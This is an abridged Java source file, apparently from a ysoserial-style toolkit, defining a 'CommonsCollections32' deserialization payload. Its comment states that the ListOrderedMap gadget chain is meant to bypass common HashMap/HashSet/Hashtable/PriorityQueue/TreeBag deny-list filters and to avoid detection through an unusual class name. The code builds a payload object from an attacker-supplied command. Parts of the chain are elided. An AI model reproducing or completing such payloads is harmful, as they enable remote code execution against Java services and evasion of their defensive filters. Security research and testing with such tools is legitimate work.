...
/*
	ListOrderedMap entry point — bypasses HashMap/HashSet/Hashtable/PQ/TreeBag filters.

	Gadget chain:
		ObjectInputStream.readObject()
			ListOrderedMap.readObject()       // AbstractMapDecorator
	...
	ListOrderedMap maintains insertion order via an internal ArrayList. Its
	readObject reads entries and calls put(), which triggers hashCode on
	keys. Unusual class name makes it unlikely to appear in any
...
public class CommonsCollections32 extends PayloadRunner implements ObjectPayload<Serializable> {
	...
	public Serializable getObject(final String command) throws Exception {
		...
		ListOrderedMap map = (ListOrderedMap) ListOrderedMap.decorate(new HashMap());
		map.put(entry, "bar");
	...
	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections32.class, args);
	}
}
